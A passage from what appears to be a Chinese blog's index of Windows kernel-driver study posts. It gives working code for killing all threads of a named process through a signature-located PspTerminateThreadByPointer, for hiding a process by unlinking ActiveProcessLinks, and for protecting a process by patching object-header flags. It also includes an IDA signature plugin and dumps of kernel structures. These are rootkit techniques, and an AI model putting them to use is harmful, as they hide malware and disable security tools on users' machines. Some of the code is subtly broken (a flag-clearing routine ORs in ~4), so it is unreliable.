*(PCH)(ObjectHeaderAddr+0xC); if (TypeIndex == 7) { int pid = *(PULONG)((PCH)pEprocess + 0xb4); PUNICODE_STRING pName = *(PULONG)((PCH)pEprocess + 0x1ec); KdPrintEx((77, 0, \"[+]: pid %04d\\tEPROCESS %x\\tTypeIndex %d\\t|| FilePath %wZ\\r\\n\", pid, pEprocess, TypeIndex, pName)); } } return STATUS_SUCCESS; } VOID DrivUnload(PDRIVER_OBJECT DriverObject) { KdPrint((\"[+]: Driver Unloaded!!!\\r\\n\")); } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { //DbgBreakPoint(); ULONG DataListAddr = GetDataListAddr(); KdPrintEx((77, 0, \"[+]: DataListAddr is %x\\r\\n\", DataListAddr)); ULONG PspCidTable = *(PULONG)(DataListAddr + 0x58); ULONG TableValue = *(PULONG)(*(PULONG)PspCidTable); KdPrintEx((77, 0, \"[+]: TableValue is %x\\r\\n\", TableValue)); switch (TableValue &amp; 0x3) { case 0: KdPrintEx((77, 0, \"[+]: One Level Table\\r\\n\")); AnalysisGlobalTable(TableValue); break; case 1: KdPrintEx((77, 0, \"[+]: Two Level Table\\r\\n\")); TableValue -= 1; for (; *(PULONG)TableValue; TableValue += 4) { AnalysisGlobalTable(*(PULONG)TableValue); } break; case 2: KdPrintEx((77, 0, \"[+]: Three Level Table\\r\\n\")); break; default: break; } pDriver->DriverUnload = DrivUnload; KdPrint((\"[+]: Driver Loaded!!!\\r\\n\")); return STATUS_SUCCESS; } 留个坑，3级表的解析没有实现，不过对于我来说也基本上用不上。。 效果如下：","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"关闭指定进程的所有线程","slug":"killThread","date":"2021-08-01T13:54:15.000Z","updated":"2021-10-25T08:09:44.611Z","comments":true,"path":"2021/08/01/killThread/","link":"","permalink":"http://example.com/2021/08/01/killThread/","excerpt":"","text":"首先定义头文件 header.h #pragma once #include &lt;ntifs.h> #include &lt;ntimage.h> typedef struct _FindCode { UCHAR code[0x200]; ULONG len; int offset; ULONG lastAddressOffset; }FindCode, * PFindCode; typedef enum _SYSTEM_INFORMATION_CLASS { SystemBasicInformation, SystemProcessorInformation, // obsolete...delete SystemPerformanceInformation, SystemTimeOfDayInformation, SystemPathInformation, SystemProcessInformation, SystemCallCountInformation, SystemDeviceInformation, SystemProcessorPerformanceInformation, SystemFlagsInformation, SystemCallTimeInformation, SystemModuleInformation, SystemLocksInformation, SystemStackTraceInformation, SystemPagedPoolInformation, SystemNonPagedPoolInformation, SystemHandleInformation, SystemObjectInformation, SystemPageFileInformation, SystemVdmInstemulInformation, SystemVdmBopInformation, SystemFileCacheInformation, SystemPoolTagInformation, SystemInterruptInformation, SystemDpcBehaviorInformation, SystemFullMemoryInformation, SystemLoadGdiDriverInformation, SystemUnloadGdiDriverInformation, SystemTimeAdjustmentInformation, SystemSummaryMemoryInformation, SystemMirrorMemoryInformation, SystemPerformanceTraceInformation, SystemObsolete0, SystemExceptionInformation, SystemCrashDumpStateInformation, SystemKernelDebuggerInformation, SystemContextSwitchInformation, SystemRegistryQuotaInformation, SystemExtendServiceTableInformation, SystemPrioritySeperation, SystemVerifierAddDriverInformation, SystemVerifierRemoveDriverInformation, SystemProcessorIdleInformation, SystemLegacyDriverInformation, SystemCurrentTimeZoneInformation, SystemLookasideInformation, SystemTimeSlipNotification, SystemSessionCreate, SystemSessionDetach, SystemSessionInformation, SystemRangeStartInformation, SystemVerifierInformation, SystemVerifierThunkExtend, SystemSessionProcessInformation, SystemLoadGdiDriverInSystemSpace, SystemNumaProcessorMap, SystemPrefetcherInformation, SystemExtendedProcessInformation, SystemRecommendedSharedDataAlignment, SystemComPlusPackage, SystemNumaAvailableMemory, SystemProcessorPowerInformation, SystemEmulationBasicInformation, SystemEmulationProcessorInformation, SystemExtendedHandleInformation, SystemLostDelayedWriteInformation, SystemBigPoolInformation, SystemSessionPoolTagInformation, SystemSessionMappedViewInformation, SystemHotpatchInformation, SystemObjectSecurityMode, SystemWatchdogTimerHandler, SystemWatchdogTimerInformation, SystemLogicalProcessorInformation, SystemWow64SharedInformation, SystemRegisterFirmwareTableInformationHandler, SystemFirmwareTableInformation, SystemModuleInformationEx, SystemVerifierTriageInformation, SystemSuperfetchInformation, SystemMemoryListInformation, SystemFileCacheInformationEx, MaxSystemInfoClass // MaxSystemInfoClass should always be the last enum } SYSTEM_INFORMATION_CLASS; typedef struct _RTL_PROCESS_MODULE_INFORMATION { HANDLE Section; // Not filled in PVOID MappedBase; PVOID ImageBase; ULONG ImageSize; ULONG Flags; USHORT LoadOrderIndex; USHORT InitOrderIndex; USHORT LoadCount; USHORT OffsetToFileName; UCHAR FullPathName[256]; } RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION; typedef struct _RTL_PROCESS_MODULES { ULONG NumberOfModules; RTL_PROCESS_MODULE_INFORMATION Modules[1]; } RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES; NTSTATUS NTAPI ZwQuerySystemInformation( __in SYSTEM_INFORMATION_CLASS SystemInformationClass, __out_bcount_opt(SystemInformationLength) PVOID SystemInformation, __in ULONG SystemInformationLength, __out_opt PULONG ReturnLength ); typedef NTSTATUS(*PSPTERMINATETHREADBYPOINTER) (PETHREAD pEThread, NTSTATUS ntExitCode, BOOLEAN bDirectTerminate); 其次完成如下功能 1.通过特征码搜索到PspTerminateThreadByPointer函数地址 2.通过进程名，获取进程PEPROCESS 3.遍历进程中线程 4.结束线程 #pragma once #include &lt;ntifs.h> #include \"header.h\" UCHAR charToHex(UCHAR* ch) { unsigned char temps[2] = { 0 }; for (int i = 0; i &lt; 2; i++) { if (ch[i] >= '0' &amp;&amp; ch[i] &lt;= '9') { temps[i] = (ch[i] - '0'); } else if (ch[i] >= 'A' &amp;&amp; ch[i] &lt;= 'F') { temps[i] = (ch[i] - 'A') + 0xA; } else if (ch[i] >= 'a' &amp;&amp; ch[i] &lt;= 'f') { temps[i] = (ch[i] - 'a') + 0xA; } } return ((temps[0] &lt;&lt; 4) &amp; 0xf0) | (temps[1] &amp; 0xf); } void initFindCodeStruct(PFindCode findCode, PCHAR code, ULONG_PTR offset, ULONG_PTR lastAddrOffset) { memset(findCode, 0, sizeof(FindCode)); findCode->lastAddressOffset = lastAddrOffset; findCode->offset = offset; PCHAR pTemp = code; ULONG_PTR i = 0; for (i = 0; *pTemp != '\\0'; i++) { if (*pTemp == '*' || *pTemp == '?') { findCode->code[i] = *pTemp; pTemp++; continue; } findCode->code[i] = charToHex(pTemp); pTemp += 2; } findCode->len = i; } ULONG_PTR findAddressByCode(ULONG_PTR beginAddr, ULONG_PTR endAddr, PFindCode findCode, ULONG numbers) { ULONG64 j = 0; LARGE_INTEGER rtna = { 0 }; for (ULONG_PTR i = beginAddr; i &lt;= endAddr; i++) { if (!MmIsAddressValid((PVOID)i)) { i = i &amp; (~0xfff) + PAGE_SIZE - 1; continue; } for (j = 0; j &lt; numbers; j++) { FindCode fc = findCode[j]; ULONG_PTR tempAddress = i; UCHAR* code = (UCHAR*)(tempAddress + fc.offset); BOOLEAN isFlags = FALSE; for (ULONG_PTR k = 0; k &lt; fc.len; k++) { if (!MmIsAddressValid((PVOID)(code + k))) { isFlags = TRUE; break; } if (fc.code[k] == '*' || fc.code[k] == '?') continue; if (code[k] != fc.code[k]) { isFlags = TRUE; break; } } if (isFlags) break; } //找到了 if (j == numbers) { rtna.QuadPart = i; rtna.LowPart += findCode[0].lastAddressOffset; break; } } return rtna.QuadPart; } char* CharToUper(char* wstr, BOOLEAN isAllocateMemory) { char* ret = NULL; if (isAllocateMemory) { int len = strlen(wstr) + 2; ret = ExAllocatePool(PagedPool, len); memset(ret, 0, len); memcpy(ret, wstr, len - 2); } else { ret = wstr; } _strupr(ret); return ret; } //返回值为模块的大小 ULONG_PTR QuerySysModule(char* MoudleName, _Out_opt_ ULONG_PTR* module) { RTL_PROCESS_MODULES info; ULONG retPro = NULL; ULONG_PTR moduleSize = 0; NTSTATUS ststas = ZwQuerySystemInformation(SystemModuleInformation, &amp;info, sizeof(info), &amp;retPro); char* moduleUper = CharToUper(MoudleName, TRUE); if (ststas == STATUS_INFO_LENGTH_MISMATCH) { //申请长度 ULONG len = retPro + sizeof(RTL_PROCESS_MODULES); PRTL_PROCESS_MODULES mem = (PRTL_PROCESS_MODULES)ExAllocatePool(PagedPool, len); memset(mem, 0, len); ststas = ZwQuerySystemInformation(SystemModuleInformation, mem, len, &amp;retPro); if (!NT_SUCCESS(ststas)) { ExFreePool(moduleUper); ExFreePool(mem); return 0; } //开始查询 if (strstr(MoudleName, \"ntkrnlpa.exe\") || strstr(MoudleName, \"ntoskrnl.exe\")) { PRTL_PROCESS_MODULE_INFORMATION ModuleInfo = &amp;(mem->Modules[0]); *module = ModuleInfo->ImageBase; moduleSize = ModuleInfo->ImageSize; } else { for (int i = 0; i &lt; mem->NumberOfModules; i++) { PRTL_PROCESS_MODULE_INFORMATION processModule = &amp;mem->Modules[i]; CharToUper(processModule->FullPathName, FALSE); if (strstr(processModule->FullPathName, moduleUper)) { if (module) { *module = processModule->ImageBase; } moduleSize = processModule->ImageSize; break; } } } ExFreePool(mem); } ExFreePool(moduleUper); return moduleSize; } ULONG searchNtCode(char* code, int offset) { FindCode fs[1] = { 0 }; initFindCodeStruct(&amp;fs[0], code, 0, offset); SIZE_T moduleBase = 0; ULONG size = QuerySysModule(\"ntkrnlpa.exe\", &amp;moduleBase); ULONG_PTR func = findAddressByCode(moduleBase, size + moduleBase, fs, 1); return func; } PEPROCESS FindProcessByNameFromIndex(PWCH name,int startPid) { PEPROCESS Process = NULL; PEPROCESS findProcess = NULL; for (int i = startPid; i &lt; 0x1000000; i++) { NTSTATUS status = PsLookupProcessByProcessId((HANDLE)i, &amp;Process); if (!NT_SUCCESS(status))continue; PUNICODE_STRING ProcessName = NULL; status = SeLocateProcessImageName(Process, &amp;ProcessName); if (!NT_SUCCESS(status)) { ObDereferenceObject(Process); continue; } if (ProcessName->Length) { _wcsupr(ProcessName->Buffer); if (wcsstr(ProcessName->Buffer, name) != 0) { findProcess = Process; ExFreePoolWithTag(ProcessName, 0); break; } } ObDereferenceObject(Process); } return findProcess; } VOID DrivUnload(PDRIVER_OBJECT DriverObject) { KdPrintEx((77,0,\"[+]: Driver Unloaded!!!\\r\\n\")); } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { //1.通过特征码搜索到PspTerminateThreadByPointer函数地址 PSPTERMINATETHREADBYPOINTER PspTerminateThreadByPointerAddr = searchNtCode(\"8B75*578DBE****F6**74*8D86****8B088B89****\", -0xb); KdPrintEx((77,0,\"PspTerminateThreadByPointer Addr is %x\\r\\n\", PspTerminateThreadByPointerAddr)); int i = 8; PEPROCESS TargetProc; while (1) { //2.通过进程名，获取进程PEPROCESS KdPrintEx((77, 0, \"Start Scan Pid from %d\\r\\n\", i)); TargetProc = FindProcessByNameFromIndex(L\"DBGVIEW.EXE\",i); if (!TargetProc) break; KdPrintEx((77, 0, \"TargetProc Addr is %x\\r\\n\", TargetProc)); //3.遍历进程中线程 PLIST_ENTRY ThreadListEntry = *(ULONG*)((PUCHAR)TargetProc + 0x188); PLIST_ENTRY head = ThreadListEntry; do { PETHREAD Ethread = (PUCHAR)ThreadListEntry - 0x268; KdPrintEx((77, 0, \"Ethread Addr is %x\\r\\n\", Ethread)); //4.结束线程 NTSTATUS status = PspTerminateThreadByPointerAddr(Ethread, 0, 1); KdPrintEx((77, 0, \"Thread End Status is 0x%x\\r\\n\", status)); ThreadListEntry = ThreadListEntry->Flink; } while (head != ThreadListEntry); i = *(ULONG*)((PUCHAR)TargetProc + 0xb4) + 4; } pDriver->DriverUnload = DrivUnload; KdPrintEx((77,0,\"[+]: Driver Loaded!!!\\r\\n\")); return STATUS_SUCCESS; } 效果如下： 成功关闭进程下所有线程。","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"特征码插件优化版","slug":"IDAParttenPro","date":"2021-07-31T10:05:08.000Z","updated":"2021-10-25T08:10:31.150Z","comments":true,"path":"2021/07/31/IDAParttenPro/","link":"","permalink":"http://example.com/2021/07/31/IDAParttenPro/","excerpt":"","text":"# -*- coding: utf-8 -*- import math import idaapi import idc def printAvd(): print(25*\"===\") info =''' Airshelf's PatternGen V2.0 ''' print(info) print(25*\"===\") try: class Kp_Menu_Context(idaapi.action_handler_t): def __init__(self): idaapi.action_handler_t.__init__(self) @classmethod def get_name(self): return self.__name__ @classmethod def get_label(self): return self.label @classmethod def register(self, plugin, label): self.plugin = plugin self.label = label instance = self() return idaapi.register_action(idaapi.action_desc_t( self.get_name(), # Name. Acts as an ID. Must be unique. instance.get_label(), # Label. That's what users see. instance # Handler. Called when activated, and for updating )) @classmethod def unregister(self): \"\"\"Unregister the action. After unregistering the class cannot be used. \"\"\" idaapi.unregister_action(self.get_name()) @classmethod def activate(self, ctx): # dummy method return 1 @classmethod def update(self, ctx): if ctx.form_type == idaapi.BWN_DISASM: return idaapi.AST_ENABLE_FOR_FORM return idaapi.AST_DISABLE_FOR_FORM class Searcher(Kp_Menu_Context): def activate(self, ctx): self.plugin.search() return 1 except: pass class PatternGen_Plugin_t(idaapi.plugin_t): comment = \"\" help = \"...\" wanted_name = \"PatternGen\" wanted_hotkey = \"ALT+Z\" flags = idaapi.PLUGIN_KEEP def init(self): try: Searcher.register(self, \"PatternGen\") except: pass return idaapi.PLUGIN_KEEP def term(self): pass def formatByte(self,ea): return \"{:02X}\".format(idc.get_wide_byte(ea)) def calcStr(self,ea, endcount): hstr = \"\" firstByte = self.formatByte(ea) hstr += self.formatByte(ea) hstr = hstr + self.formatByte(ea + 1) if (firstByte == \"FF\" or firstByte == \"66\" or firstByte == \"67\") else hstr #print(math.ceil(endcount - len(hstr) / 2)) hstr = hstr + math.ceil(endcount - len(hstr) / 2) * \"*\" if endcount >= 2 else hstr return hstr def extractCode(self): printAvd() start = idc.read_selection_start() end = idc.read_selection_end() codeSize = end - start ea = start # print hex(ea) result = \"\" for i in range(codeSize): op1 = idc.get_operand_type(ea, 0) op2 = idc.get_operand_type(ea, 1) instructionSize = idc.get_item_size(ea) if op1 == idc.o_reg and (op2 == idc.o_reg or op2 == idc.o_void or op2 == idc.o_phrase): for b in range(0, instructionSize): result += self.formatByte(ea + b) elif (op1 == idc.o_reg and op2 == idc.o_displ) or (op1 == idc.o_displ and op2 == idc.o_reg) or ( op1 == idc.o_displ and op2 == idc.o_imm): result += self.formatByte(ea) + self.formatByte(ea + 1) for b in range(2, instructionSize): result = result + \"*\" elif op1 == idc.o_phrase and op2 == idc.o_reg: for b in range(0, instructionSize): result += self.formatByte(ea + b) else: result += self.calcStr(ea, instructionSize) ea = ea + instructionSize if ea >= (start + codeSize): break # print (idc.get_event_module_base() - idc.SelStart()); print((\"%s Offset:%s\") % (idc.get_func_name(start),hex(start - idc.get_func_attr(start,0)))) # print (\"%s Address:0x%x Offset:0x%x\" % (idc.get_func_name(idc.here()),idc.here(), idc.here() - idaapi.get_imagebase())) # print(result) return result def run(self, arg): if (idc.BADADDR != idc.here()): copyContent = self.extractCode() print(copyContent) # clipboard.copy(copyContent) # register IDA plugin def PLUGIN_ENTRY(): return PatternGen_Plugin_t() printAvd() 使用[ALT + Z]生成特征码，效果如下：","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"获取内核全局变量","slug":"GetGlobalPara","date":"2021-07-27T05:41:13.000Z","updated":"2021-10-25T08:12:13.818Z","comments":true,"path":"2021/07/27/GetGlobalPara/","link":"","permalink":"http://example.com/2021/07/27/GetGlobalPara/","excerpt":"","text":"#include &lt;ntifs.h> //0x28 bytes (sizeof) typedef struct _DBGKD_GET_VERSION64 { USHORT MajorVersion; //0x0 USHORT MinorVersion; //0x2 UCHAR ProtocolVersion; //0x4 UCHAR KdSecondaryVersion; //0x5 USHORT Flags; //0x6 USHORT MachineType; //0x8 UCHAR MaxPacketType; //0xa UCHAR MaxStateChange; //0xb UCHAR MaxManipulate; //0xc UCHAR Simulation; //0xd USHORT Unused[1]; //0xe ULONGLONG KernBase; //0x10 ULONGLONG PsLoadedModuleList; //0x18 ULONGLONG DebuggerDataList; //0x20 } DBGKD_GET_VERSION,* PDBGKD_GET_VERSION; ULONG GetKiProcessBlock() { ULONG procNum = NULL; KeSetSystemAffinityThread(1); procNum = KeGetCurrentProcessorNumber(); KdPrintEx((77, 0, \"Current Processor is No.%x\\r\\n\", procNum)); if (procNum) return 0; PKPCR kpcr; kpcr = __readfsdword(0x1C); //_KPCR.SelfPcr PDBGKD_GET_VERSION dbgVer = (PDBGKD_GET_VERSION)kpcr->KdVersionBlock; LONGLONG pDataList = (LONGLONG)dbgVer->DebuggerDataList; ULONG address = *(PULONG)pDataList; ULONG KiProcessBlock = *(PULONG)(address + 0x218); for (int i = 0; i &lt; KeNumberProcessors; i++) { KdPrintEx((77, 0, \"=============No.%x Processor============\\r\\n\", i)); KdPrintEx((77, 0, \"KPRCB:%x\\r\\n\", *(PULONG)(KiProcessBlock + i*4))); kpcr = (PKPCR)((*(PULONG)(KiProcessBlock + i * 4)) - 0x120); KdPrintEx((77, 0, \"GDT:%x, IDT:%x\\r\\n\", kpcr->GDT,kpcr->IDT)); } KeRevertToUserAffinityThread(); return KiProcessBlock; } VOID DrivUnload(PDRIVER_OBJECT DriverObject) { //KdPrintEx((77,0,\"--------Driver Unload -------------------\\r\\n\")); } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { //DbgBreakPoint(); GetKiProcessBlock(); pDriver->DriverUnload = DrivUnload; // KdPrintEx((77, 0, \"--------Driver Loaded : %wZ--------------\\r\\n\", pReg)); return STATUS_SUCCESS; } 效果如下：","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"进程断链隐藏","slug":"HideProcess","date":"2021-07-26T15:56:05.000Z","updated":"2021-10-25T08:11:24.223Z","comments":true,"path":"2021/07/26/HideProcess/","link":"","permalink":"http://example.com/2021/07/26/HideProcess/","excerpt":"","text":"通过EPROCESS断链隐藏进程 #include &lt;ntifs.h> VOID DrivUnload(PDRIVER_OBJECT DriverObject) { KdPrint((\"[+]: Driver Unloaded!!!\\r\\n\")); } ULONG GetActiveProcessLinksOffset() { static ULONG offset = 0; if (offset)return offset; UNICODE_STRING Name; RtlInitUnicodeString(&amp;Name,L\"PsGetProcessId\"); PUCHAR func = (PUCHAR)MmGetSystemRoutineAddress(&amp;Name); for (int i = 0; i &lt; 100; i++) { if (func[i] == 0x8b &amp;&amp; func[i + 1] == 0x80) { offset = *(PULONG)(func + i + 2); offset += 4; break; } } return offset; } PEPROCESS FindProcessByName(PWCH name) { PEPROCESS Process = NULL; PEPROCESS findProcess = NULL; for (int i = 8; i &lt; 0x1000000; i++) { NTSTATUS status = PsLookupProcessByProcessId((HANDLE)i, &amp;Process); if (!NT_SUCCESS(status))continue; PUNICODE_STRING ProcessName = NULL; status = SeLocateProcessImageName(Process, &amp;ProcessName); if (!NT_SUCCESS(status)) { ObDereferenceObject(Process); continue; } if (ProcessName->Length) { _wcsupr(ProcessName->Buffer); if (wcsstr(ProcessName->Buffer, name) != 0) { findProcess = Process; break; } } ExFreePoolWithTag(ProcessName, 0); ObDereferenceObject(Process); } return findProcess; } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { PEPROCESS Process = FindProcessByName(L\"DBGVIEW.EXE\"); ULONG offset = GetActiveProcessLinksOffset(); RemoveEntryList((PUCHAR)Process + offset); InitializeListHead((PUCHAR)Process + offset); ObReferenceObject(Process); pDriver->DriverUnload = DrivUnload; KdPrint((\"[+]: Driver Loaded!!!\\r\\n\")); return STATUS_SUCCESS; } 效果如下，成功隐藏DbgView.exe：","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"保护进程","slug":"ProtectProcess","date":"2021-07-26T15:52:56.000Z","updated":"2021-10-25T08:07:35.590Z","comments":true,"path":"2021/07/26/ProtectProcess/","link":"","permalink":"http://example.com/2021/07/26/ProtectProcess/","excerpt":"","text":"通过修改进程对象的_OBJECT_HEADER中的FLAGS标志，完成对R3进程的保护，受保护的进程不可被其他程序附加、关闭。 手工修改方法如下： PROCESS 86c69070 SessionId: 1 Cid: 0e48 Peb: 7ffdc000 ParentCid: 0a28 DirBase: 3f2f5560 ObjectTable: 8fb1e818 HandleCount: 88. Image: Dbgview.exe kd> dt _OBJECT_HEADER 86c69070-0x18 nt!_OBJECT_HEADER +0x000 PointerCount : 0n55 +0x004 HandleCount : 0n4 +0x004 NextToFree : 0x00000004 Void +0x008 Lock : _EX_PUSH_LOCK +0x00c TypeIndex : 0x7 '' +0x00d TraceFlags : 0 '' +0x00e InfoMask : 0x8 '' +0x00f Flags : 0x4 '' +0x010 ObjectCreateInfo : 0x86a68300 _OBJECT_CREATE_INFORMATION +0x010 QuotaBlockCharged : 0x86a68300 Void +0x014 SecurityDescriptor : 0x93f3151e Void +0x018 Body : _QUAD 通过代码实验如下： #include &lt;ntifs.h> NTKERNELAPI UCHAR* PsGetProcessImageFileName( __in PEPROCESS Process ); NTSTATUS PsLookupProcessByProcessId( __in HANDLE ProcessId, __deref_out PEPROCESS* Process ); VOID UPdateProcessFlags(PEPROCESS PProcess) { PUCHAR ObjectHeaders = NULL; #ifdef _WIN64 ObjectHeaders = (PUCHAR)PProcess - 0x30; *((ULONG*)(ObjectHeaders + 0x1b)) |= 4; #else ObjectHeaders = (PUCHAR)PProcess - 0x18; *((ULONG*)(ObjectHeaders + 0xf)) |= 4; #endif } VOID CloseProcessFlags(PEPROCESS PProcess) { PUCHAR ObjectHeaders = NULL; #ifdef _WIN64 ObjectHeaders = (PUCHAR)PProcess - 0x30; *((ULONG*)(ObjectHeaders + 0x1b)) |= ~4; #else ObjectHeaders = (PUCHAR)PProcess - 0x18; *((ULONG*)(ObjectHeaders + 0xf)) |= ~4; #endif } PEPROCESS FindProcessByName(char* Name) { PEPROCESS findProcess = NULL; for (int i = 4; i &lt; 0x1000000; i += 4) { PEPROCESS Process = NULL; NTSTATUS status = PsLookupProcessByProcessId((HANDLE)i, &amp;Process); if (!NT_SUCCESS(status)) { continue; } PUCHAR processname = PsGetProcessImageFileName(Process); if (processname &amp;&amp; _stricmp(processname, Name) == 0) { findProcess = Process; break; } ObDereferenceObject(Process); } return findProcess; } VOID DrivUnload(PDRIVER_OBJECT DriverObject) { PEPROCESS pProcess = FindProcessByName(\"Dbgview.exe\"); if (pProcess == 0) { return STATUS_UNSUCCESSFUL; } CloseProcessFlags(pProcess); ObReferenceObject(pProcess); KdPrint((\"[+]: Driver Unloaded!!!\\r\\n\")); } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { //DbgBreakPoint(); PEPROCESS pProcess = FindProcessByName(\"dbgView.exe\"); if (pProcess == 0) { return STATUS_UNSUCCESSFUL; } UPdateProcessFlags(pProcess); ObReferenceObject(pProcess); pDriver->DriverUnload = DrivUnload; KdPrint((\"[+]: Driver Loaded!!!\\r\\n\")); return STATUS_SUCCESS; } 效果如下:","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"常用内核结构体","slug":"KernalStruct","date":"2021-07-23T05:54:37.000Z","updated":"2021-10-25T08:09:50.109Z","comments":true,"path":"2021/07/23/KernalStruct/","link":"","permalink":"http://example.com/2021/07/23/KernalStruct/","excerpt":"","text":"kd&gt; dt _OBJECT_HEADER nt!_OBJECT_HEADER +0x000 PointerCount : Int4B +0x004 HandleCount : Int4B +0x004 NextToFree : Ptr32 Void +0x008 Lock : _EX_PUSH_LOCK +0x00c TypeIndex : UChar +0x00d TraceFlags : UChar +0x00e InfoMask : UChar +0x00f Flags : UChar +0x010 ObjectCreateInfo : Ptr32 _OBJECT_CREATE_INFORMATION +0x010 QuotaBlockCharged : Ptr32 Void +0x014 SecurityDescriptor : Ptr32 Void +0x018 Body : _QUAD kd&gt; dt nt!_KPROCESS +0x000 Header : _DISPATCHER_HEADER +0x010 ProfileListHead : _LIST_ENTRY +0x018 DirectoryTableBase : Uint4B +0x01c LdtDescriptor : _KGDTENTRY +0x024 Int21Descriptor : _KIDTENTRY +0x02c ThreadListHead : _LIST_ENTRY +0x034 ProcessLock : Uint4B +0x038 Affinity : _KAFFINITY_EX +0x044 ReadyListHead : _LIST_ENTRY +0x04c SwapListEntry : _SINGLE_LIST_ENTRY +0x050 ActiveProcessors : _KAFFINITY_EX +0x05c AutoAlignment : Pos 0, 1 Bit +0x05c DisableBoost : Pos 1, 1 Bit +0x05c DisableQuantum : Pos 2, 1 Bit +0x05c ActiveGroupsMask : Pos 3, 1 Bit +0x05c ReservedFlags : Pos 4, 28 Bits +0x05c ProcessFlags : Int4B +0x060 BasePriority : Char +0x061 QuantumReset : Char +0x062 Visited : UChar +0x063 Unused3 : UChar +0x064 ThreadSeed : [1] Uint4B +0x068 IdealNode : [1] Uint2B +0x06a IdealGlobalNode : Uint2B +0x06c Flags : _KEXECUTE_OPTIONS +0x06d Unused1 : UChar +0x06e IopmOffset : Uint2B +0x070 Unused4 : Uint4B +0x074 StackCount : _KSTACK_COUNT +0x078 ProcessListEntry : _LIST_ENTRY +0x080 CycleTime : Uint8B +0x088 KernelTime : Uint4B +0x08c UserTime : Uint4B +0x090 VdmTrapcHandler : Ptr32 Void kd&gt; dt nt!_EPROCESS +0x000 Pcb : _KPROCESS +0x098 ProcessLock : _EX_PUSH_LOCK +0x0a0 CreateTime : _LARGE_INTEGER +0x0a8 ExitTime : _LARGE_INTEGER +0x0b0 RundownProtect : _EX_RUNDOWN_REF +0x0b4 UniqueProcessId : Ptr32 Void +0x0b8 ActiveProcessLinks : _LIST_ENTRY +0x0c0 ProcessQuotaUsage : [2] Uint4B +0x0c8 ProcessQuotaPeak : [2] Uint4B +0x0d0 CommitCharge : Uint4B +0x0d4 QuotaBlock : Ptr32 _EPROCESS_QUOTA_BLOCK +0x0d8 CpuQuotaBlock : Ptr32 _PS_CPU_QUOTA_BLOCK +0x0dc PeakVirtualSize : Uint4B +0x0e0 VirtualSize : Uint4B +0x0e4 SessionProcessLinks : _LIST_ENTRY +0x0ec DebugPort : Ptr32 Void +0x0f0 ExceptionPortData : Ptr32 Void +0x0f0 ExceptionPortValue : Uint4B +0x0f0 ExceptionPortState : Pos 0, 3 Bits +0x0f4 ObjectTable : Ptr32 _HANDLE_TABLE +0x0f8 Token : _EX_FAST_REF +0x0fc WorkingSetPage : Uint4B +0x100 AddressCreationLock : _EX_PUSH_LOCK +0x104 RotateInProgress : Ptr32 _ETHREAD +0x108 ForkInProgress : Ptr32 _ETHREAD +0x10c HardwareTrigger : Uint4B +0x110 PhysicalVadRoot : Ptr32 _MM_AVL_TABLE +0x114 CloneRoot : Ptr32 Void +0x118 NumberOfPrivatePages : Uint4B +0x11c NumberOfLockedPages : Uint4B +0x120 Win32Process : Ptr32 Void +0x124 Job : Ptr32 _EJOB +0x128 SectionObject : Ptr32 Void +0x12c SectionBaseAddress : Ptr32 Void +0x130 Cookie : Uint4B +0x134 Spare8 : Uint4B +0x138 WorkingSetWatch : Ptr32 _PAGEFAULT_HISTORY +0x13c Win32WindowStation : Ptr32 Void +0x140 InheritedFromUniqueProcessId : Ptr32 Void +0x144 LdtInformation : Ptr32 Void +0x148 VdmObjects : Ptr32 Void +0x14c ConsoleHostProcess : Uint4B +0x150 DeviceMap : Ptr32 Void +0x154 EtwDataSource : Ptr32 Void +0x158 FreeTebHint : Ptr32 Void +0x160 PageDirectoryPte : _HARDWARE_PTE +0x160 Filler : Uint8B +0x168 Session : Ptr32 Void +0x16c ImageFileName : [15] UChar +0x17b PriorityClass : UChar +0x17c JobLinks : _LIST_ENTRY +0x184 LockedPagesList : Ptr32 Void +0x188 ThreadListHead : _LIST_ENTRY +0x190 SecurityPort : Ptr32 Void +0x194 PaeTop : Ptr32 Void +0x198 ActiveThreads : Uint4B +0x19c ImagePathHash : Uint4B +0x1a0 DefaultHardErrorProcessing : Uint4B +0x1a4 LastThreadExitStatus : Int4B +0x1a8 Peb : Ptr32 _PEB +0x1ac PrefetchTrace : _EX_FAST_REF +0x1b0 ReadOperationCount : _LARGE_INTEGER +0x1b8 WriteOperationCount : _LARGE_INTEGER +0x1c0 OtherOperationCount : _LARGE_INTEGER +0x1c8 ReadTransferCount : _LARGE_INTEGER +0x1d0 WriteTransferCount : _LARGE_INTEGER +0x1d8 OtherTransferCount : _LARGE_INTEGER +0x1e0 CommitChargeLimit : Uint4B +0x1e4 CommitChargePeak : Uint4B +0x1e8 AweInfo : Ptr32 Void +0x1ec SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO +0x1f0 Vm : _MMSUPPORT +0x25c MmProcessLinks : _LIST_ENTRY +0x264 HighestUserAddress : Ptr32 